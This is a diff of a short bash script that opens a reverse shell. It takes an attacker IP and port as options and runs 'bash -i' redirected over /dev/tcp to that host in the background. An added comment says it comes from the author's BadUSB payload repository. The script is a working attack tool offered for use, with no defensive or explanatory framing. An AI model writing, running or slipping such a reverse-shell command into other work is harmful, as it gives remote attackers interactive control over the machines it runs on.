@@ -1,6 +1,7 @@
 #!/bin/bash
 
-# very similar to mac's revshell but for bash instead of zsh
+# very similar to mac's revshell but for bash instead of zsh.
+# basically copied from my badusb online payload: https://github.com/SkepticSeptic/badUSBonlinePayload/blob/main/revshellMacnLinux.sh
 
 while getopts ":I:P:" opt; do
   case $opt in
@@ -16,7 +17,7 @@ done
 
 echo "Attempting to establish reverse shell on $IP_ADDRESS:$PORT..."
 
-bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1 &
+/bin/bash -i >& /dev/tcp/$IP_ADDRESS/$PORT 0>&1 &
 
 # Wait for a brief moment to allow the shell to establish
 sleep 1
